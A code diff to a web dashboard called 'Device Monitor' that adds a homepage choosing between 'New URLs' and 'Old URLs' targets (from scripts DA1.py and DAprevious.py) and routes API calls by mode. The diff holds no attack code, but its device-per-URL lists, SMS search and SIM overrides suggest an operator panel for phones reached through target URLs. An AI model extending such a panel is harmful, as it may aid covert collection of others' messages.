@@ -29,6 +29,24 @@
   .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--muted); }
   .btn-ghost:hover { border-color: var(--accent); color: var(--text); }
 
+  /* ── Mode toggle ── */
+  .mode-toggle { display:flex; gap:6px; }
+  .mode-btn { background:var(--bg3); border:1px solid var(--border); border-radius:6px;
+              color:var(--muted); padding:5px 14px; cursor:pointer; font-size:13px; font-weight:600; }
+  .mode-btn.active { background:var(--accent); border-color:var(--accent); color:#fff; }
+  .mode-btn:hover:not(.active) { border-color:var(--accent); color:var(--text); }
+
+  /* ── Homepage selector ── */
+  #view-home { display:none; }
+  #view-home.active { display:flex; align-items:center; justify-content:center; min-height:70vh; }
+  .home-cards { display:flex; gap:24px; flex-wrap:wrap; justify-content:center; }
+  .home-card { background:var(--bg2); border:2px solid var(--border); border-radius:16px;
+               padding:36px 48px; cursor:pointer; text-align:center; transition:border-color .15s, transform .1s; min-width:220px; }
+  .home-card:hover { border-color:var(--accent); transform:translateY(-4px); }
+  .home-card .hc-icon { font-size:48px; margin-bottom:12px; }
+  .home-card .hc-title { font-size:20px; font-weight:700; margin-bottom:6px; }
+  .home-card .hc-sub { color:var(--muted); font-size:13px; }
+
   /* ── Main layout ── */
   main { padding: 16px 20px; }
   #view-urls, #view-devices { display: none; }
@@ -156,8 +174,12 @@
 </head>
 <body>
 <header>
-  <h1>📡 Device Monitor</h1>
+  <h1 id="header-title" style="cursor:pointer" onclick="showHome()">📡 Device Monitor</h1>
   <span class="badge" id="total-badge">—</span>
+  <div class="mode-toggle" id="mode-toggle" style="display:none">
+    <button class="mode-btn active" id="btn-new" onclick="switchMode('new')">🆕 New URLs</button>
+    <button class="mode-btn"        id="btn-old" onclick="switchMode('old')">📦 Old URLs</button>
+  </div>
   <div class="search-bar">
     <input type="text" id="search-input" placeholder="Search URL or host…">
     <button class="btn btn-ghost" id="refresh-btn" onclick="loadUrls()">↻ Refresh</button>
@@ -165,6 +187,22 @@
 </header>
 
 <main>
+  <!-- ── Homepage selector ── -->
+  <div id="view-home" class="active">
+    <div class="home-cards">
+      <div class="home-card" onclick="switchMode('new')">
+        <div class="hc-icon">🆕</div>
+        <div class="hc-title">New URLs</div>
+        <div class="hc-sub">DA1.py targets<br>IDs 1–97</div>
+      </div>
+      <div class="home-card" onclick="switchMode('old')">
+        <div class="hc-icon">📦</div>
+        <div class="hc-title">Old URLs</div>
+        <div class="hc-sub">DAprevious.py targets<br>IDs 20–100</div>
+      </div>
+    </div>
+  </div>
+
   <!-- ── URL list view ── -->
   <div id="view-urls" class="active">
     <div class="stats-bar" id="stats-bar"></div>
@@ -268,6 +306,31 @@ let currentDevices = [];
 let currentUrlId = 0;
 let activeFilter = 'all';
 let currentSort = 'total';
+let currentMode = 'new'; // 'new' | 'old'
+
+// ── Mode switching ────────────────────────────────────────────────────────────
+function apiPrefix() { return currentMode === 'old' ? '/api/old' : '/api'; }
+
+function switchMode(mode) {
+  currentMode = mode;
+  document.getElementById('btn-new').classList.toggle('active', mode === 'new');
+  document.getElementById('btn-old').classList.toggle('active', mode === 'old');
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+  document.getElementById('mode-toggle').style.display = '';
+  document.getElementById('total-badge').textContent = '—';
+  allUrls = [];
+  loadUrls();
+}
+
+function showHome() {
+  document.getElementById('view-home').classList.add('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+}
 
 // ── Sort helpers ──────────────────────────────────────────────────────────────
 function sortUrls(urls, sortKey) {
@@ -306,8 +369,9 @@ const REMOVED_IDS = new Set([3,4,6,7,31,38,47]);
 
 async function loadUrls() {
   document.getElementById('url-grid').innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
-  const res = await fetch('/api/urls');
-  allUrls = (await res.json()).filter(u => !REMOVED_IDS.has(u.id));
+  const res = await fetch(`${apiPrefix()}/urls`);
+  const raw = await res.json();
+  allUrls = currentMode === 'new' ? raw.filter(u => !REMOVED_IDS.has(u.id)) : raw;
   renderUrls(allUrls);
   renderStats(allUrls);
 }
@@ -441,6 +505,7 @@ document.getElementById('search-input').addEventListener('input', async () => {
 
 // ── Open URL devices ──────────────────────────────────────────────────────────
 async function openUrl(id) {
+  document.getElementById('view-home').classList.remove('active');
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.add('active');
   clearSmsSearch();
@@ -448,7 +513,7 @@ async function openUrl(id) {
   document.getElementById('device-tbody').innerHTML = `<tr><td colspan="12"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
   currentUrlId = id;
 
-  const res = await fetch(`/api/url/${id}`);
+  const res = await fetch(`${apiPrefix()}/url/${id}`);
   const data = await res.json();
   currentDevices = data.devices || [];
 
@@ -554,6 +619,7 @@ function renderDevices() {
 function showUrls() {
   clearSmsSearch();
   document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-home').classList.remove('active');
   document.getElementById('view-urls').classList.add('active');
 }
 
@@ -761,7 +827,7 @@ async function saveSimEdit(evt, deviceId, slot) {
   if (!inp) return;
   const val = inp.value.trim();
   try {
-    await fetch(`/api/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}`,
+    await fetch(`${apiPrefix()}/sim-overrides/${currentUrlId}/${encodeURIComponent(deviceId)}`,
       { method: 'POST', headers: {'Content-Type':'application/json'},
         body: JSON.stringify({ [slot]: val }) });
     // Update in-memory device
@@ -914,7 +980,9 @@ function clearSmsSearch() {
 }
 
 // ── Init ──────────────────────────────────────────────────────────────────────
-loadUrls();
+// Start on homepage — user picks New or Old
+document.getElementById('view-urls').classList.remove('active');
+document.getElementById('view-home').classList.add('active');
 </script>
 </body>
 </html>
